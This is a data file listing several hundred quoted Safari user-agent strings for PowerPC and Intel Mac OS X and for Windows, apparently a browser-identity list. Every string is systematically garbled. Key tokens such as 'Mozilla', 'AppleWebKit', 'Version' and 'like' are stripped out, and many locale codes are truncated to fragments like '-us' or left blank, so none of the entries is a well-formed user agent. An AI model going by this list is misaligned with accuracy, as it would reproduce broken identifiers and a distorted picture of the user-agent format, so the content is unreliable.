	"/5.0 Macintosh; U; Intel Mac OS X; es-es /523.15.1 KHTML,  Gecko /3.0.4 Safari/523.15"
	"/5.0 Macintosh; U; Intel Mac OS X; -us /525.1+ KHTML,  Gecko /3.0.4 Safari/523.10"
	"/5.0 Windows; U; Windows NT 6.0;  /522.15.5 KHTML,  Gecko /3.0.3 Safari/522.15.5"
	"/5.0 Windows; U; Windows NT 6.0; cs /522.15.5 KHTML,  Gecko /3.0.3 Safari/522.15.5"
	"/5.0 Windows; U; Windows NT 5.1; sv /522.15.5 KHTML,  Gecko /3.0.3 Safari/522.15.5"
	"/5.0 Windows; U; Windows NT 5.1; fr /522.15.5 KHTML,  Gecko /3.0.3 Safari/522.15.5"
	"/5.0 Windows; U; Windows NT 5.1;  /522.15.5 KHTML,  Gecko /3.0.3 Safari/522.15.5"
	"/5.0 Windows; U; Windows NT 5.1;  /522.15.5 KHTML,  Gecko /3.0.3 Safari/522.15.5"
	"/5.0 Windows; U; Windows NT 5.1; -DK /523.11.1+ KHTML,  Gecko /3.0.3 Safari/522.15.5"
	"/5.0 Windows; U; Windows NT 5.1;  /522.15.5 KHTML,  Gecko /3.0.3 Safari/522.15.5"
	"/5.0 Windows; U; Windows NT 5.1; cs /522.15.5 KHTML,  Gecko /3.0.3 Safari/522.15.5"
	"/5.0 Macintosh; U; PPC Mac OS X; -us /523.6 KHTML,  Gecko /3.0.3 Safari/523.6"
	"/5.0 Macintosh; U; PPC Mac OS X;  /523.3+ KHTML,  Gecko /3.0.3 Safari/522.12.1"
	"/5.0 Macintosh; U; PPC Mac OS X;  /522.11.1 KHTML,  Gecko /3.0.3 Safari/522.12.1"
	"/5.0 Macintosh; U; PPC Mac OS X; -es /522.11.1 KHTML,  Gecko /3.0.3 Safari/522.12.1"
	"/5.0 Macintosh; U; Intel Mac OS X; - /522.11.1 KHTML,  Gecko /3.0.3 Safari/522.12.1"
	"/5.0 Macintosh; U; Intel Mac OS X; -us /522.11.1 KHTML,  Gecko /3.0.3 Safari/522.12.1"
	"/5.0 Macintosh; U; Intel Mac OS X;  /523.9+ KHTML,  Gecko /3.0.3 Safari/522.12.1"
	"/5.0 Macintosh; U; Intel Mac OS X;  /523.5+ KHTML,  Gecko /3.0.3 Safari/522.12.1"
	"/5.0 Macintosh; U; Intel Mac OS X;  /523.2+ KHTML,  Gecko /3.0.3 Safari/522.12.1"
	"/5.0 Macintosh; U; Intel Mac OS X;  /522.11.1 KHTML,  Gecko /3.0.3 Safari/522.12.1"
	"/5.0 Macintosh; U; Intel Mac OS X; - /522.11.1 KHTML,  Gecko /3.0.3 Safari/522.12.1"
	"/5.0 Windows; U; Windows NT 6.0; nl /522.13.1 KHTML,  Gecko /3.0.2 Safari/522.13.1"
	"/5.0 Windows; U; Windows NT 5.2; zh /522.13.1 KHTML,  Gecko /3.0.2 Safari/522.13.1"
	"/5.0 Windows; U; Windows NT 5.2;  /522.13.1 KHTML,  Gecko /3.0.2 Safari/522.13.1"
	"/5.0 Windows; U; Windows NT 5.1; nl /522.13.1 KHTML,  Gecko /3.0.2 Safari/522.13.1"
	"/5.0 Windows; U; Windows NT 5.1;  /522.13.1 KHTML,  Gecko /3.0.2 Safari/522.13.1"
	"/5.0 Windows; U; Windows NT 5.1;  /522.13.1 KHTML,  Gecko /3.0.2 Safari/522.13.1"
	"/5.0 Windows; U; Windows NT 5.1; el /522.13.1 KHTML,  Gecko /3.0.2 Safari/522.13.1"
	"/5.0 Windows; U; Windows NT 5.1; cs /522.13.1 KHTML,  Gecko /3.0.2 Safari/522.13.1"
	"/5.0 Macintosh; U; PPC Mac OS X; -us /522.11 KHTML,  Gecko /3.0.2 Safari/522.12"
	"/5.0 Macintosh; U; PPC Mac OS X; -us /522+ KHTML,  Gecko /3.0.2 Safari/522.12"
	"/5.0 Macintosh; U; PPC Mac OS X;  /522.11 KHTML,  Gecko /3.0.2 Safari/522.12"
	"/5.0 Macintosh; U; PPC Mac OS X; - /522.11 KHTML,  Gecko /3.0.2 Safari/522.12"
	"/5.0 Macintosh; U; Intel Mac OS X;  /522.11 KHTML,  Gecko /3.0.2 Safari/522.12"
	"/5.0 Macintosh; U; Intel Mac OS X;  /522+ KHTML,  Gecko /3.0.2 Safari/522.12"
	"/5.0 Windows; U; Windows NT 6.0; fi /522.12.1 KHTML,  Gecko /3.0.1 Safari/522.12.2"
	"/5.0 Windows; U; Windows NT 6.0;  /522.12.1 KHTML,  Gecko /3.0.1 Safari/522.12.2"
	"/5.0 Windows; U; Windows NT 5.1; th /522.12.1 KHTML,  Gecko /3.0.1 Safari/522.12.2"
	"/5.0 Windows; U; Windows NT 5.1; sv /522.12.1 KHTML,  Gecko /3.0.1 Safari/522.12.2"
	"/5.0 Windows; U; Windows NT 5.1; nl /522.12.1 KHTML,  Gecko /3.0.1 Safari/522.12.2"
	"/5.0 Windows; U; Windows NT 5.1;  /522.4.1+ KHTML,  Gecko /3.0.1 Safari/522.12.2"
	"/5.0 Windows; U; Windows NT 5.1;  /522.12.1 KHTML,  Gecko /3.0.1 Safari/522.12.2"
	"/5.0 Windows; U; Windows NT 5.0;  /522.12.1 KHTML,  Gecko /3.0.1 Safari/522.12.2"
	"/5.0 Windows; U; Windows NT 6.0; sv-SE /523.13 KHTML,  Gecko /3.0 Safari/523.13"
	"/5.0 Windows; U; Windows NT 6.0; nl /522.11.3 KHTML,  Gecko /3.0 Safari/522.11.3"
	"/5.0 Windows; U; Windows NT 6.0; -US /523.15 KHTML,  Gecko /3.0 Safari/523.15"
	"/5.0 Windows; U; Windows NT 6.0; -DK /523.12.9 KHTML,  Gecko /3.0 Safari/523.12.9"
	"/5.0 Windows; U; Windows NT 5.2;  /522.11.3 KHTML,  Gecko /3.0 Safari/522.11.3"
	"/5.0 Windows; U; Windows NT 5.2; nl /522.11.3 KHTML,  Gecko /3.0 Safari/522.11.3"
	"/5.0 Windows; U; Windows NT 5.1; zh-TW /523.15 KHTML,  Gecko /3.0 Safari/523.15"
	"/5.0 Windows; U; Windows NT 5.1; zh /522.11.3 KHTML,  Gecko /3.0 Safari/522.11.3"
	"/5.0 Windows; U; Windows NT 5.1; tr-TR /523.15 KHTML,  Gecko /3.0 Safari/523.15"
	"/5.0 Windows; U; Windows NT 5.1; sv /522.11.3 KHTML,  Gecko /3.0 Safari/522.11.3"
	"/5.0 Windows; U; Windows NT 5.1;  /522.11.3 KHTML,  Gecko /3.0 Safari/522.11.3"
	"/5.0 Windows; U; Windows NT 5.1; -BR /525+ KHTML,  Gecko /3.0 Safari/523.15"
	"/5.0 Windows; U; Windows NT 5.1; -BR /523.15 KHTML,  Gecko /3.0 Safari/523.15"
	"/5.0 Windows; U; Windows NT 5.1; pl-PL /523.15 KHTML,  Gecko /3.0 Safari/523.15"
	"/5.0 Windows; U; Windows NT 5.1; pl-PL /523.12.9 KHTML,  Gecko /3.0 Safari/523.12.9"
	"/5.0 Windows; U; Windows NT 5.1; nl /522.11.3 KHTML,  Gecko /3.0 Safari/522.11.3"
	"/5.0 Windows; U; Windows NT 5.1; nb /522.11.3 KHTML,  Gecko /3.0 Safari/522.11.3"
	"/5.0 Windows; U; Windows NT 5.1;  /522.11.3 KHTML,  Gecko /3.0 Safari/522.11.3"
	"/5.0 Windows; U; Windows NT 5.1; hr /522.11.3 KHTML,  Gecko /3.0 Safari/522.11.3"
	"/5.0 Windows; U; Windows NT 5.1; fr-FR /523.15 KHTML,  Gecko /3.0 Safari/523.15"
	"/5.0 Macintosh; U; PPC Mac OS X; sv- /419 KHTML,  Gecko Safari/419.3"
	"/5.0 Macintosh; U; PPC Mac OS X; sv- /418.9 KHTML,  Gecko Safari/419.3"
	"/5.0 Macintosh; U; PPC Mac OS X; sv- /418.9 KHTML,  Gecko Safari/"
	"/5.0 Macintosh; U; PPC Mac OS X; - /418.9.1 KHTML,  Gecko Safari/419.3"
	"/5.0 Macintosh; U; PPC Mac OS X; nl-nl /418.8 KHTML,  Gecko Safari/419.3"
	"/5.0 Macintosh; U; PPC Mac OS X; - /418.9.1 KHTML,  Gecko Safari/419.3"
	"/5.0 Macintosh; U; PPC Mac OS X; - /418.9 KHTML,  Gecko Safari/419.3"
	"/5.0 Macintosh; U; PPC Mac OS X; - /419 KHTML,  Gecko Safari/419.3"
	"/5.0 Macintosh; U; PPC Mac OS X; - /418.9 KHTML,  Gecko Safari/419.3"
	"/5.0 Macintosh; U; PPC Mac OS X; fr /418.9.1 KHTML,  Gecko Safari/419.3"
	"/5.0 Macintosh; U; PPC Mac OS X; fi-fi /418.8 KHTML,  Gecko Safari/419.3"
	"/5.0 Macintosh; U; PPC Mac OS X; es-es /418.8 KHTML,  Gecko Safari/419.3"
	"/5.0 Macintosh; U; PPC Mac OS X; es /419 KHTML,  Gecko Safari/419.3"
	"/5.0 Macintosh; U; PPC Mac OS X; en_CA /419 KHTML,  Gecko Safari/419.3"
	"/5.0 Macintosh; U; PPC Mac OS X; -us /419 KHTML,  Gecko Safari/419.3"
	"/5.0 Macintosh; U; PPC Mac OS X; -us /418.9 KHTML,  Gecko Safari/419.3"
	"/5.0 Macintosh; U; PPC Mac OS X; -us /418.8 KHTML,  Gecko Safari/419.3"
	"/5.0 Macintosh; U; PPC Mac OS X;  /419 KHTML,  Gecko Safari/419.3"
	"/5.0 Macintosh; U; PPC Mac OS X;  /418.9.1 KHTML,  Gecko Safari/419.3"
	"/5.0 Macintosh; U; PPC Mac OS X;  /418.9 KHTML,  Gecko Safari/419.3"
	"/5.0 Macintosh; U; PPC Mac OS X; tr-tr /418 KHTML,  Gecko Safari/417.9.3"
	"/5.0 Macintosh; U; PPC Mac OS X; sv- /418 KHTML,  Gecko Safari/417.9.3"
	"/5.0 Macintosh; U; PPC Mac OS X; sv- /417.9 KHTML,  Gecko Safari/417.8_Adobe"
	"/5.0 Macintosh; U; PPC Mac OS X; nl-nl /418 KHTML,  Gecko Safari/417.9.3"
	"/5.0 Macintosh; U; PPC Mac OS X; nl-nl /417.9 KHTML,  Gecko Safari/417.9.2"
	"/5.0 Macintosh; U; PPC Mac OS X; nl-nl /417.9 KHTML,  Gecko Safari/417.8"
	"/5.0 Macintosh; U; PPC Mac OS X; nb-no /418 KHTML,  Gecko Safari/417.9.3"
	"/5.0 Macintosh; U; PPC Mac OS X; nb-no /417.9 KHTML,  Gecko Safari/417.8"
	"/5.0 Macintosh; U; PPC Mac OS X; - /417.9 KHTML,  Gecko Safari/417.9.2"
	"/5.0 Macintosh; U; PPC Mac OS X; - /417.9 KHTML,  Gecko Safari/417.8"
	"/5.0 Macintosh; U; PPC Mac OS X; fr-fr /417.9 KHTML,  Gecko Safari/417.8"
	"/5.0 Macintosh; U; PPC Mac OS X; fr /417.9 KHTML,  Gecko Safari/417.8"
	"/5.0 Macintosh; U; PPC Mac OS X; fr /417.9 KHTML,  Gecko"
	"/5.0 Macintosh; U; PPC Mac OS X; es /418 KHTML,  Gecko Safari/417.9.3"
	"/5.0 Macintosh; U; PPC Mac OS X; es /417.9 KHTML,  Gecko Safari/417.8"
	"/5.0 Macintosh; U; PPC Mac OS X; -us /418 KHTML,  Gecko Safari/417.9.2"
	"/5.0 Macintosh; U; PPC Mac OS X; -us /417.9 KHTML,  Gecko Safari/417.9.2"
	"/5.0 Macintosh; U; PPC Mac OS X; -us /417.9 KHTML,  Gecko Safari/417.8"
	"/5.0 Macintosh; U; PPC Mac OS X;  /418 KHTML,  Gecko Safari/417.9.3"
	"/5.0 Macintosh; U; PPC Mac OS X;  /418 KHTML,  Gecko Safari/417.9.2"
	"/5.0 Macintosh; U; PPC Mac OS X; nl-nl /416.12 KHTML,  Gecko Safari/416.13"
	"/5.0 Macintosh; U; PPC Mac OS X; nl-nl /416.11 KHTML,  Gecko Safari/416.12"
	"/5.0 Macintosh; U; PPC Mac OS X; nl-nl /416.11 KHTML,  Gecko Safari/312"
	"/5.0 Macintosh; U; PPC Mac OS X; nb-no /416.12 KHTML,  Gecko Safari/416.13"
	"/5.0 Macintosh; U; PPC Mac OS X; - /416.12 KHTML,  Gecko Safari/416.13"
	"/5.0 Macintosh; U; PPC Mac OS X; - /416.12 KHTML,  Gecko Safari/416.13"
	"/5.0 Macintosh; U; PPC Mac OS X; fr-fr /416.12 KHTML,  Gecko Safari/416.13"
	"/5.0 Macintosh; U; PPC Mac OS X; fr-fr /416.11 KHTML,  Gecko Safari/416.12"
	"/5.0 Macintosh; U; PPC Mac OS X; fr /416.12 KHTML,  Gecko Safari/416.13_Adobe"
	"/5.0 Macintosh; U; PPC Mac OS X; fr /416.12 KHTML,  Gecko Safari/416.13"
	"/5.0 Macintosh; U; PPC Mac OS X; fr /416.12 KHTML,  Gecko Safari/412.5"
	"/5.0 Macintosh; U; PPC Mac OS X; fr /416.11 KHTML,  Gecko Safari/416.12"
	"/5.0 Macintosh; U; PPC Mac OS X; -us /416.12 KHTML,  Gecko Safari/416.13"
	"/5.0 Macintosh; U; PPC Mac OS X; -us /416.11 KHTML,  Gecko Safari/416.12"
	"/5.0 Macintosh; U; PPC Mac OS X; - /416.11 KHTML,  Gecko Safari/416.12"
	"/5.0 Macintosh; U; PPC Mac OS X;  /416.12 KHTML,  Gecko Safari/416.13"
	"/5.0 Macintosh; U; PPC Mac OS X;  /416.11 KHTML,  Gecko Safari/416.12"
	"/5.0 Macintosh; U; PPC Mac OS X;  /416.11 KHTML,  Gecko"
	"/5.0 Macintosh; U; PPC Mac OS X; - /416.12 KHTML,  Gecko Safari/416.13_Adobe"
	"/5.0 Macintosh; U; PPC Mac OS X; - /416.12 KHTML,  Gecko Safari/416.13"
	"/5.0 Macintosh; U; PPC Mac OS X; - /412.7 KHTML,  Gecko Safari/412.5"
	"/5.0 Macintosh; U; PPC Mac OS X; - /412.7 KHTML,  Gecko Safari/412.5"
	"/5.0 Macintosh; U; PPC Mac OS X; fr-fr /412.7 KHTML,  Gecko Safari/412.5"
	"/5.0 Macintosh; U; PPC Mac OS X; fr /412.7 KHTML,  Gecko Safari/412.5"
	"/5.0 Macintosh; U; PPC Mac OS X; -us /412.7 KHTML,  Gecko Safari/412.5"
	"/5.0 Macintosh; U; PPC Mac OS X;  /412.7 KHTML,  Gecko Safari/412.6"
	"/5.0 Macintosh; U; PPC Mac OS X;  /412.7 KHTML,  Gecko Safari/412.5"
	"/5.0 Macintosh; U; PPC Mac OS X; - /412.7 KHTML,  Gecko Safari/412.5_Adobe"
	"/5.0 Macintosh; U; PPC Mac OS X; - /412.7 KHTML,  Gecko Safari/412.5"
	"/5.0 Macintosh; U; PPC Mac OS; pl-pl /412 KHTML,  Gecko Safari/412"
	"/5.0 Macintosh; U; PPC Mac OS; - /412 KHTML,  Gecko Safari/412"
	"/5.0 Macintosh; U; PPC Mac OS X; - /412.6 KHTML,  Gecko Safari/412.2"
	"/5.0 Macintosh; U; PPC Mac OS X; fr-fr /412 KHTML,  Gecko Safari/412"
	"/5.0 Macintosh; U; PPC Mac OS X; fr /412.6 KHTML,  Gecko Safari/412.2"
	"/5.0 Macintosh; U; PPC Mac OS X; fr /412 KHTML,  Gecko Safari/412"
	"/5.0 Macintosh; U; PPC Mac OS X; es-ES /412 KHTML,  Gecko Safari/412"
	"/5.0 Macintosh; U; PPC Mac OS X; en_US /412 KHTML,  Gecko Safari/412"
	"/5.0 Macintosh; U; PPC Mac OS X; -us /412.6 KHTML,  Gecko Safari/412.2"
	"/5.0 Macintosh; U; PPC Mac OS X; -us /412 KHTML,  Gecko Safari/412 Privoxy/3.0"
	"/5.0 Macintosh; U; PPC Mac OS X; -us /412 KHTML,  Gecko Safari/412"
	"/5.0 Macintosh; U; PPC Mac OS X;  /412.6.2 KHTML,  Gecko Safari/412.2.2"
	"/5.0 Macintosh; U; PPC Mac OS X;  /412.6.2 KHTML,  Gecko"
	"/5.0 Macintosh; U; PPC Mac OS X;  /412.6 KHTML,  Gecko Safari/412.2"
	"/5.0 Macintosh; U; PPC Mac OS X;  /412 KHTML,  Gecko Safari/412"
	"/5.0 Macintosh; U; PPC Mac OS X; - /412.6.2 KHTML,  Gecko Safari/412.2.2"
	"/5.0 Macintosh; U; PPC Mac OS X; - /412.6 KHTML,  Gecko Safari/412.2_Adobe"
	"/5.0 Macintosh; U; PPC Mac OS X; - /412.6 KHTML,  Gecko Safari/412.2"
	"/5.0 Macintosh; U; PPC Mac OS X; - /412.6 KHTML,  Gecko"
	"/5.0 Macintosh; U; PPC Mac OS X; - /412 KHTML,  Gecko Safari/412"
	"/5.0 Macintosh; U; PPC Mac OS X; sv- /312.8 KHTML,  Gecko Safari/312.5"
	"/5.0 Macintosh; U; PPC Mac OS X; - /312.8 KHTML,  Gecko Safari/312.6"
	"/5.0 Macintosh; U; PPC Mac OS X; fr-fr /312.8 KHTML,  Gecko Safari/312.6"
	"/5.0 Macintosh; U; PPC Mac OS X; fr-fr /312.8 KHTML,  Gecko Safari/312.5"
	"/5.0 Macintosh; U; PPC Mac OS X; fr /312.8 KHTML,  Gecko Safari/312.5"
	"/5.0 Macintosh; U; PPC Mac OS X; -us /312.8.1 KHTML,  Gecko Safari/312.6"
	"/5.0 Macintosh; U; PPC Mac OS X; -us /312.8 KHTML,  Gecko Safari/312.6"
	"/5.0 Macintosh; U; PPC Mac OS X; -us /312.8 KHTML,  Gecko Safari/312.5"
	"/5.0 Macintosh; U; PPC Mac OS X;  /312.8 KHTML,  Gecko Safari/312.6"
	"/5.0 Macintosh; U; PPC Mac OS X;  /312.8 KHTML,  Gecko Safari/312.5"
	"/5.0 Macintosh; U; PPC Mac OS X;  /312.8 KHTML,  Gecko Safari/312.3.3"
	"/5.0 Macintosh; U; PPC Mac OS X; - /312.8.1 KHTML,  Gecko Safari/312.6"
	"/5.0 Macintosh; U; PPC Mac OS X; - /312.8 KHTML,  Gecko Safari/312.5_Adobe"
	"/5.0 Macintosh; U; PPC Mac OS X; - /312.8 KHTML,  Gecko Safari/312.5"
	"/5.0 Macintosh; U; PPC Mac OS X; sv- /312.5.2 KHTML,  Gecko Safari/312.3.3"
	"/5.0 Macintosh; U; PPC Mac OS X; sv- /312.5.1 KHTML,  Gecko Safari/312.3.1"
	"/5.0 Macintosh; U; PPC Mac OS X; - /312.5.1 KHTML,  Gecko Safari/312.3.1"
	"/5.0 Macintosh; U; PPC Mac OS X; - /312.5.1 KHTML,  Gecko Safari/312.3.1"
	"/5.0 Macintosh; U; PPC Mac OS X; fr-fr /312.5.2 KHTML,  Gecko Safari/312.3.3"
	"/5.0 Macintosh; U; PPC Mac OS X; fr-fr /312.5.1 KHTML,  Gecko Safari/312.3.1"
	"/5.0 Macintosh; U; PPC Mac OS X; fr-fr /312.5 KHTML,  Gecko Safari/312.3"
	"/5.0 Macintosh; U; PPC Mac OS X; fr /312.5.2 KHTML,  Gecko Safari/312.3.3"
	"/5.0 Macintosh; U; PPC Mac OS X; fr /312.5.1 KHTML,  Gecko Safari/312.3.1"
	"/5.0 Macintosh; U; PPC Mac OS X; fr /312.5 KHTML,  Gecko Safari/312.3"
	"/5.0 Macintosh; U; PPC Mac OS X; es-es /312.5.2 KHTML,  Gecko Safari/312.3.3"
	"/5.0 Macintosh; U; PPC Mac OS X; es /312.5.1 KHTML,  Gecko Safari/312.3.1"
	"/5.0 Macintosh; U; PPC Mac OS X; -us /312.5.1 KHTML,  Gecko Safari/312.3.1"
	"/5.0 Macintosh; U; PPC Mac OS X; -us /312.5 KHTML,  Gecko Safari/312.3"
	"/5.0 Macintosh; U; PPC Mac OS X;  /312.5.2 KHTML,  Gecko Safari/312.3.3"
	"/5.0 Macintosh; U; PPC Mac OS X;  /312.5.2 KHTML,  Gecko Safari/125"
	"/5.0 Macintosh; U; PPC Mac OS X;  /312.5.1 KHTML,  Gecko Safari/312.3.1"
	"/5.0 Macintosh; U; PPC Mac OS X;  /312.5.1 KHTML,  Gecko Safari/125.9"
	"/5.0 Macintosh; U; PPC Mac OS X;  /312.5 KHTML,  Gecko Safari/312.3"
	"/5.0 Macintosh; U; PPC Mac OS X; - /312.5.2 KHTML,  Gecko Safari/312.3.3"
	"/5.0 Macintosh; U; PPC Mac OS X; - /312.1 KHTML,  Gecko Safari/312"
	"/5.0 Macintosh; U; PPC Mac OS X; fr-fr /312.1.1 KHTML,  Gecko Safari/312"
	"/5.0 Macintosh; U; PPC Mac OS X; fr-fr /312.1 KHTML,  Gecko Safari/312"
	"/5.0 Macintosh; U; PPC Mac OS X; fr-fr /312.1 KHTML,  Gecko Safari/125"
	"/5.0 Macintosh; U; PPC Mac OS X; fr-ch /312.1.1 KHTML,  Gecko Safari/312"
	"/5.0 Macintosh; U; PPC Mac OS X; fr- /312.1 KHTML,  Gecko Safari/312"
	"/5.0 Macintosh; U; PPC Mac OS X; -us /312.1 KHTML,  Gecko Safari/312"
	"/5.0 Macintosh; U; PPC Mac OS X; -us /312.1 KHTML,  Gecko"
	"/5.0 Macintosh; U; PPC Mac OS X;  /312.1.1 KHTML,  Gecko Safari/312"
	"/5.0 Macintosh; U; PPC Mac OS X;  /312.1 KHTML,  Gecko Safari/312"
	"/5.0 Macintosh; U; PPC Mac OS X; - /312.1.1 KHTML,  Gecko Safari/312"
	"/5.0 Macintosh; U; PPC Mac OS X; - /312.1 KHTML,  Gecko Safari/312.3.1"
	"/5.0 Macintosh; U; PPC Mac OS X; - /312.1 KHTML,  Gecko Safari/312"
	"/5.0 Macintosh; U; PPC Mac OS X; -ch /312.1 KHTML,  Gecko Safari/312"
	"/5.0 Macintosh; U; PPC Mac OS X; fr-fr /125.5.6 KHTML,  Gecko Safari/125.12"
	"/5.0 Macintosh; U; PPC Mac OS X; fr-fr /125.5.5 KHTML,  Gecko Safari/125.12"
	"/5.0 Macintosh; U; PPC Mac OS X; fr-fr /125.5.5 KHTML,  Gecko Safari/125.11"
	"/5.0 Macintosh; U; PPC Mac OS X; fr-ch /125.5.5 KHTML,  Gecko Safari/125.12"
	"/5.0 Macintosh; U; PPC Mac OS X; fr-ch /125.5.5 KHTML,  Gecko Safari/125.11"
	"/5.0 Macintosh; U; PPC Mac OS X; -us /125.5.7 KHTML,  Gecko Safari/125.12"
	"/5.0 Macintosh; U; PPC Mac OS X; -us /125.5.6 KHTML,  Gecko Safari/125.12"
	"/5.0 Macintosh; U; PPC Mac OS X; -us /125.5.5 KHTML,  Gecko Safari/125.12"
	"/5.0 Macintosh; U; PPC Mac OS X; -us /125.5.5 KHTML,  Gecko Safari/125.11"
	"/5.0 Macintosh; U; PPC Mac OS X;  /125.5.7 KHTML,  Gecko Safari/125.12"
	"/5.0 Macintosh; U; PPC Mac OS X;  /125.5.6 KHTML,  Gecko Safari/125.12"
	"/5.0 Macintosh; U; PPC Mac OS X;  /125.5.5 KHTML,  Gecko Safari/125.5.5"
	"/5.0 Macintosh; U; PPC Mac OS X;  /125.5.5 KHTML,  Gecko Safari/125.12"
	"/5.0 Macintosh; U; PPC Mac OS X;  /125.5.5 KHTML,  Gecko Safari/125.11"
	"/5.0 Macintosh; U; PPC Mac OS X;  /125.5.5 KHTML,  Gecko Safari/125"
	"/5.0 Macintosh; U; PPC Mac OS X; - /125.5.7 KHTML,  Gecko Safari/125.12"
	"/5.0 Macintosh; U; PPC Mac OS X; - /125.5.6 KHTML,  Gecko Safari/125.12_Adobe"
	"/5.0 Macintosh; U; PPC Mac OS X; - /125.5.6 KHTML,  Gecko Safari/125.12"
	"/5.0 Macintosh; U; PPC Mac OS X; - /125.5.5 KHTML,  Gecko Safari/125.12_Adobe"
	"/5.0 Macintosh; U; PPC Mac OS X; - /125.5.5 KHTML,  Gecko Safari/125.12"
	"/5.0 Macintosh; U; PPC Mac OS X; - /125.4 KHTML,  Gecko Safari/125.9"
	"/5.0 Macintosh; U; PPC Mac OS X; fr-fr /125.5 KHTML,  Gecko Safari/125.9"
	"/5.0 Macintosh; U; PPC Mac OS X; fr-fr /125.4 KHTML,  Gecko Safari/125.9"
	"/5.0 Macintosh; U; PPC Mac OS X; en_CA /125.4 KHTML,  Gecko Safari/125.9"
	"/5.0 Macintosh; U; PPC Mac OS X; -us /125.4 KHTML,  Gecko Safari/125.9"
	"/5.0 Macintosh; U; PPC Mac OS X; - /125.4 KHTML,  Gecko Safari/125.9"
	"/5.0 Macintosh; U; PPC Mac OS X;  /125.5 KHTML,  Gecko Safari/125.9"
	"/5.0 Macintosh; U; PPC Mac OS X;  /125.4 KHTML,  Gecko Safari/125.9"
	"/5.0 Macintosh; U; PPC Mac OS X;  /125.4 KHTML,  Gecko Safari/100"
	"/5.0 Macintosh; U; PPC Mac OS X; - /125.4 KHTML,  Gecko Safari/125.9"
	"/5.0 Macintosh; U; PPC Mac OS X; es-es /125.2 KHTML,  Gecko Safari/125.8"
	"/5.0 Macintosh; U; PPC Mac OS X; -us /125.2 KHTML,  Gecko Safari/125.7"
	"/5.0 Macintosh; U; PPC Mac OS X; -gb /125.2 KHTML,  Gecko Safari/125.8"
	"/5.0 Macintosh; U; PPC Mac OS X;  /125.2 KHTML,  Gecko Safari/85.8"
	"/5.0 Macintosh; U; PPC Mac OS X;  /125.2 KHTML,  Gecko Safari/125.8"
	"/5.0 Macintosh; U; PPC Mac OS X;  /125.2 KHTML,  Gecko Safari/125.7"
	"/5.0 Macintosh; U; PPC Mac OS X;   /125.2 KHTML,  Gecko Safari/125.8"
	"/5.0 Macintosh; U; PPC Mac OS X; - /125.2 KHTML,  Gecko Safari/125.8"
	"/5.0 Macintosh; U; PPC Mac OS X; - /125.2 KHTML,  Gecko Safari/125.7"
	"/5.0 Macintosh; U; PPC Mac OS X; - /124 KHTML,  Gecko Safari/125.1"
	"/5.0 Macintosh; U; PPC Mac OS X; -us /124 KHTML,  Gecko Safari/125"
	"/5.0 Macintosh; U; PPC Mac OS X;  /124 KHTML,  Gecko Safari/125"
	"/5.0 Macintosh; U; PPC Mac OS X;  /124 KHTML,  Gecko"
	"/5.0 Macintosh; U; PPC Mac OS X; - /124 KHTML,  Gecko Safari/125.1"
	"/5.0 Macintosh; U; PPC Mac OS X; - /124 KHTML,  Gecko Safari/125"
	"/5.0 Macintosh; U; PPC Mac OS X; fr-fr /85.8.5 KHTML,  Gecko Safari/85.8.1"
	"/5.0 Macintosh; U; PPC Mac OS X; fr /85.8.5 KHTML,  Gecko Safari/85.8.1"
	"/5.0 Macintosh; U; PPC Mac OS X; -us /85.8.5 KHTML,  Gecko Safari/85.8.1"
	"/5.0 Macintosh; U; PPC Mac OS X; -us /85.8.2 KHTML,  Gecko Safari/85.8"
	"/5.0 Macintosh; U; PPC Mac OS X; -gb /85.8.5 KHTML,  Gecko Safari/85.8.1"
	"/5.0 Macintosh; U; PPC Mac OS X;  /85.8.5 KHTML,  Gecko Safari/85.8.1"
	"/5.0 Macintosh; U; PPC Mac OS X;  /85.8.2 KHTML,  Gecko Safari/85.8.1"
	"/5.0 Macintosh; U; PPC Mac OS X; - /85.8.5 KHTML,  Gecko Safari/85.8.1"
	"/5.0 Macintosh; U; PPC Mac OS X; - /85.8.5 KHTML,  Gecko Safari/85"
	"/5.0 Macintosh; U; PPC Mac OS X; - /85.8.2 KHTML,  Gecko Safari/85.8"
	"/5.0 Macintosh; U; PPC Mac OS X; sv- /85.7 KHTML,  Gecko Safari/85.5"
	"/5.0 Macintosh; U; PPC Mac OS X; - /85.7 KHTML,  Gecko Safari/85.5"
	"/5.0 Macintosh; U; PPC Mac OS X; fr-fr /85.7 KHTML,  Gecko Safari/85.5"
	"/5.0 Macintosh; U; PPC Mac OS X; fr /85.7 KHTML,  Gecko Safari/85.5"
	"/5.0 Macintosh; U; PPC Mac OS X; -us /85.7 KHTML,  Gecko Safari/85.6"
	"/5.0 Macintosh; U; PPC Mac OS X; -us /85.7 KHTML,  Gecko Safari/85.5"
	"/5.0 Macintosh; U; PPC Mac OS X; - /85.7 KHTML,  Gecko Safari/85.7"
	"/5.0 Macintosh; U; PPC Mac OS X; - /85.7 KHTML,  Gecko Safari/85.5"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.3 Gecko/2008092816  Safari 1.1.3"
	"/5.0 Windows; U; Windows NT 6.1; zh-CN /533+ KHTML,  Gecko"
	"/5.0 Windows; U; Windows NT 5.1; -US /528.8 KHTML,  Gecko"
	"/5.0 Windows NT 5.1 /534.34 KHTML,  Gecko /1.40 Safari/534.34"
	"/5.0 Macintosh; U; PPC Mac OS X; fi-fi /420+ KHTML,  Gecko Safari/419.3"
	"/5.0 Macintosh; U; PPC Mac OS X;  /312.8.1 KHTML,  Gecko Safari/312.6"
	"/5.0 Macintosh; U; PPC Mac OS X; - /419.2 KHTML,  Gecko Safari/419.3"
	"/5.0 Macintosh; U; PPC Mac OS X; - /418.9.1 KHTML,  Gecko Safari/419.3"
	"/5.0 Macintosh; U; PPC Mac OS X; -ch /85 KHTML,  Gecko Safari/85"
	"/5.0 Macintosh; U; PPC Mac OS X; -CH /419.2 KHTML,  Gecko Safari/419.3"
	"/5.0 Macintosh; U; PPC Mac OS X; -dk /522+ KHTML,  Gecko Safari/419.3"
	"/5.0 Macintosh; U; PPC Mac OS X 10_5_6; -us /528.16 KHTML,  Gecko"
	"/5.0 Macintosh; U; Intel Mac OS X; -IT /521.25 KHTML,  Gecko Safari/521.24"
	"/5.0 Macintosh; U; Intel Mac OS X; -us /419.2.1 KHTML,  Gecko Safari/419.3"
	"/5.0 Macintosh; U; Intel Mac OS X;  /522.11.1 KHTML,  Gecko Safari/419.3"
	"/5.0 Macintosh; U; Intel Mac OS X;  /521.32.1 KHTML,  Gecko Safari/521.32.1"
	"/5.0 Macintosh; U; Intel Mac OS X;   KHTML,  Gecko"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_3; es-es /531.22.7 KHTML,  Gecko"
